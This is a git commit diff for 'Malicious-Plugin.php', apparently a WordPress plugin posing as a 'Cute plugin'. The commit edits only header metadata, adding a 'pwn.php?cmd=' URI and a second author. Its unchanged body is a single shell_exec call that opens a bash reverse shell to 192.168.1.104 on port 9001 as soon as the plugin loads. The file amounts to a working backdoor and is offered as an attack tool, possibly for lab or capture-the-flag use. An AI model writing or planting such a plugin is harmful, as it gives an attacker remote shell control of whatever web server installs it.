c275a7d5544439490141c669b3e36f0cd2e0fecd
zAbuQasem <74984708+zAbuQasem@users.noreply.github.com>
2022-05-25 01:20:56 +0300

    Update Malicious-Plugin.php

--- Malicious-Plugin.php
+++ Malicious-Plugin.php
@@ -1,10 +1,10 @@
 <?php
 /**
 * Plugin Name: Cute plugin
-* Plugin URI:
-* Description: Definitely not a malicious plugin (i think )
+* Plugin URI: https://127.0.0.1:31337/pwn.php?cmd=whomai
+* Description: Definitely not a malicious plugin.
 * Version: 1337.0
-* Author: Zeyad Abulaban
+* Author: Zeyad Abulaban & Omar Albalouli
 * Author URI: https://hackers.org
 */
 shell_exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.104/9001 0>&1'")
